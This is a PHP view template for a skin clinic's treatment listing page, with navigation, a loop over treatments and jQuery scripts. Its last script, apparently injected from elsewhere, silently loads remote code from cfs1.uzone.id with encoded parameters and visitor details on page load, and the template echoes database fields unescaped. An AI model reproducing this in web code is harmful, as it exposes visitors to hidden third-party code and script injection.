	<!DOCTYPE html>
	<html class=" js csstransitions" lang="en"><head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<!-- Meta Tag -->	
	    <meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width">
	<meta name="keywords" content="Fuchsia, skin, clinic, klinik, perawatan wajah, perawatan kulit, modern technology, anti aging, anti acne, penuaan dini, hair series, hairmate series">
	<meta name="description" content="Pusat perawatan wajah dan klinik kecantikan kulit yang memadukan teknologi terkini dalam perawatan kulit dan tenaga profesional yang siap membantu Anda wujudkan impian kulit sehat dan terawat">
	<link rel="shortcut icon" href="http://www.natasha-skin.com/upload/images/favicon/fav_ofm5DVF.png">

	<title>Fuchsia Skin Clinic Center - Klinik Kecantikan Pusat Perawatan Wajah dan Kulit - Produk</title>


		
			<!-- Css -->	
		<link rel="stylesheet" href="<?php echo base_url('natasha_files/bootstrap.css');?>"/>
	<link rel="stylesheet" href="<?php echo base_url('natasha_files/style_002.css');?>"/>
	<link rel="stylesheet" href="<?php echo base_url('natasha_files/color.css');?>"/>
	<link rel="stylesheet" href="<?php echo base_url('natasha_files/jquery_003.css');?>"/>
	<link rel="stylesheet" href="<?php echo base_url('natasha_files/flexslider.css');?>"/>
	<link rel="stylesheet" href="<?php echo base_url('natasha_files/bootstrap-responsive.css');?>"/>
	<link rel="stylesheet" href="<?php echo base_url('natasha_files/main.css');?>"/>
	<link rel="stylesheet" href="<?php echo base_url('natasha_files/font-awesome.css');?>"/>
	<link rel="stylesheet" href="<?php echo base_url('natasha_files/jquery.css');?>"/>
	<link rel="stylesheet" href="<?php echo base_url('natasha_files/style.css');?>"/>

	<link rel="stylesheet" href="<?php echo base_url('natasha_files/jquery_002.css');?>"/>	
	<script src="<?php echo base_url('natasha_files/analytics.js');?>" async="">
		
	</script>
	<script>
	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

	  ga('create', 'UA-98291804-1', 'auto');
	  ga('send', 'pageview');
	</script><script src="<?php echo base_url('natasha_files/request.htm');?>" async="" type="text/javascript"></script>
	</head>
	<body id="home">
		<div class="wrapper">
			<!-- Header -->	
			<div class="header">        
		<div class="top-strip" id="back-top"><div class="container"></div></div>
		<div class="navigation home">
			<div class="container">
				<div class="row">
					<div class="col-sm-2">
						<div class="logo visible-desktop">
							
								<img src="<?php echo base_url('natasha_files/img_jagKKrJ.jpg');?>" class="img-responsive" alt="Fuchsia Skin Clinic Center" height="150px">
							</a>
						 </div>
					</div>
					<div class="col-sm-10 visible-desktop">
						<ul style="padding-bottom: 10px">
							<li style="padding:31px 15px 4px 6px;">
								<a href="<?php echo site_url('home/about');?>">ABOUT US</a></li>
							<li style="padding:31px 15px 4px 6px;">
							<a href="<?php echo site_url('home/treatment');?>">TREATMENT</a></li>
							<li style="padding:31px 15px 4px 6px;">
							<a href="<?php echo site_url('home/product');?>">PRODUCT</a></li>
							<li style="padding:31px 15px 4px 6px;">
							<a href="<?php echo site_url('home/contact');?>">CONTACT US</a></li>
							<li style="padding:31px 15px 4px 6px;">
							<a href="<?php echo site_url('home/login');?>">LOGIN</a></li>
							
						</ul>
					</div>
				</div>
				<ol class="breadcrumb">
        <li class="breadcrumb-item">
          <a href="index">Home</a>
        </li>
        <li class="breadcrumb-item active">Treatment</li>
      </ol>
			</div>
		</div>

		  <div class="container">

      <!-- Page Heading/Breadcrumbs -->
      <h1 class="mt-4 mb-3">Treatment
        <br><small>"Jika ingin pesan Treatment, silahkan login terlebih dahulu"</small>
      </h1>

      <ol class="breadcrumb">
        <li class="breadcrumb-item">
          <a href="index_member">Home</a>
        </li>
        <li class="breadcrumb-item">
          <a href="<?php echo base_url()."Welcome/status_member/".$this->session->userdata('username'); ?>">Status Pemesanan</a>
      </ol>
      
        
    
      <div class="row">
        <?php foreach ($treatment as $key => $value) { ?>
        <div class="col-lg-3 col-md-4 col-sm-6 portfolio-item">
          <div class="card h-100">
            <a href="#"><img class="card-img-top" src="<?php echo site_url()?>assets/uploads/<?php echo $value->gambar_treatment; ?>" alt=""></a>
            <div class="card-body">
              <h4 class="card-title">
                
              </h4>
                <ul class="list-group list-group-flush">
                   
                    <li class="list-group-item"> <?php echo $value->nama_treatment; ?></li>
                    <li class="list-group-item"> <?php echo $value->deskripsi_treatment;; ?></li>
                    <li class="list-group-item"><?php echo $value->harga_treatment; ; ?></li>

                    <li class="list-group-item">
                       <center><a href="<?php echo base_url()."Home/login"?>" class="btn btn-primary">Pesan</a>
                        
                        
                    </li>
                </ul>
            </div>
          </div>
          
        </div><?php } ?>
 
      </div>

      <!-- Pagination -->
      
    </div>
    <!-- /.container -->

    </div>
    <!-- /.container -->


<!-- Footer -->
			<div class="wrapper copyrights">
		<div class="col-lg-12">
			<p class="text-center" style="color:#111;"> 
				Copyright © 2017 <span style="color:#E02187">Fuchsia Skin Clinic Center</span> 
				Designed by <a href="http:/raja15ti@mahasiswa.co.id/" target="_blank" style="font-size:12px;color:#111">RajaPutriAnnisa</a>
			</p>
		</div>
		<div class="span6">
			<div class="go-top">
				<a style="display: none;" class="scroll-topp" id="back-top"><img src="<?php echo base_url('natasha_files/go-to-top.png');?>" alt=""></a>
			</div>
		</div>
	</div> 
	<div class="clearfix"></div>	
		</div>
		<!-- Javascript -->
			<script type="text/javascript" src="<?php echo base_url('natasha_files/jquery.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/modernizr.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/bootstrap.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/bootstrap_002.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/jquery_005.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/jquery_003.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/jquery_004.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/functions.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/chart.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/prism.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/jquery_006.js');?>"></script><script src="<?php echo base_url('natasha_files/jquery_007.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/jquery_002.js');?>"></script>
	<script type="text/javascript" src="<?php echo base_url('natasha_files/sidenav.js');?>"></script>
	<script type="text/javascript">
	    $(document).ready(function() {
	        $('#sidenav').simplerSidebar({
	            opener: '#toggle-sidebar',
	            sidebar: {
	                align: 'left', //or 'right' - This option can be ignored, the sidebar will automatically align to right.
	                width: 300, //You can ignore this option, the sidebar will automatically size itself to 300px.
	                closingLinks: '.close-sidebar' // If you ignore this option, the plugin will look for all links and this can be buggy. Choose a class for every object inside the sidebar that once clicked will close the sidebar.
	            }
	        });
	    });
	</script>

	<script>
		$('#search-btn').on('click', function() {
			$("#search-icon").toggleClass('fa-search fa-times margin-2');
			$("#search-box").toggleClass('show hidden animated fadeInUp');
			return false;
		});
	</script>
	<script>
	    $(document).ready(function(){
	        if (Modernizr.touch) {
	            // show the close overlay button
	            $(".close-overlay").removeClass("hidden");
	            // handle the adding of hover class when clicked
	            $(".img").click(function(e){
	                if (!$(this).hasClass("hover")) {
	                    $(this).addClass("hover");
	                }
	            });
	            // handle the closing of the overlay
	            $(".close-overlay").click(function(e){
	                e.preventDefault();
	                e.stopPropagation();
	                if ($(this).closest(".img").hasClass("hover")) {
	                    $(this).closest(".img").removeClass("hover");
	                }
	            });
	        } else {
	            // handle the mouseenter functionality
	            $(".img").mouseenter(function(){
	                $(this).addClass("hover");
	            })
	            // handle the mouseleave functionality
	            .mouseleave(function(){
	                $(this).removeClass("hover");
	            });
	        }
	    });
	</script>


	<script type="text/javascript">
		$(document).ready(function(){
			$("#myModal").modal('show');
			$('.hide-modal').click(function(){
				$('#myModal').modal('hide');
			}); 
		});
	</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31bJcvuBJs5tJQUksDxq8sUBdsJ%2bEC5VEg9tQmM3kixbCyhILdwRiKJw31qMeTT8sKcNVy143jrJVYktLWZTDKmLym5IgN3EFoq0WGn4aGA6fcXH8MVG1UDC9BWj7WosB8SlLphnr87PzXgBFeKmpSDdQDBIxaL%2btSl5zb4KXcc6BCH0In9%2bHzcQIaxcxNUUPIwyguJGTJ0WsMEDDJJOrgWkj2bCCS1MnUUz8GV%2bv3B4ho6sjZyRcx%2fw2DMU7xwF%2fL8MvhwpVF6YHtd%2bDVTyvnp9jrIB2L94Or8QMe806B79C1Jtf2OOslmzrPgXaegQyYRF%2bm2%2bRPfap%2bstgrhd9IeVTnW6x6PKJyerIq6jO2I4Y5RHSXZkwiHHFU8qIHiQvObWfJGTanDlQ7Ftj9TRkVEhxb%2fyylZMvzRA13Z0YDcgr7QCV%2fOTS06YzaQt2cudFYuGn%2bUPZbb9TwL5ZWc2od7ACEGeip%2bPXXYc8qJdm30GMx3%2f8276c592mAgOvEnD2ggGKz0TN71TcXftXJLx0fpxFQiQUznBzSbnDRhGH910XGhzmpxfmM4Cn0edaqxahkNoZRa9xE4go6kH0FAFL%2fX16L5%2bS4YhDgG9PZigFLJ%2ft14JjcJkofMIP3vLkwX%2fF01rLLnSl3DflmlakPILTukeVtfdxSCv85lxJTBW626ZYjS5iPQXDXpE%2bBwTH0I%2blOnG3oImHac70%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
	<div style="position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; z-index: 2999; display: none; background-color: black; opacity: 0.5;" data-simplersidebar="mask"></div></body></html>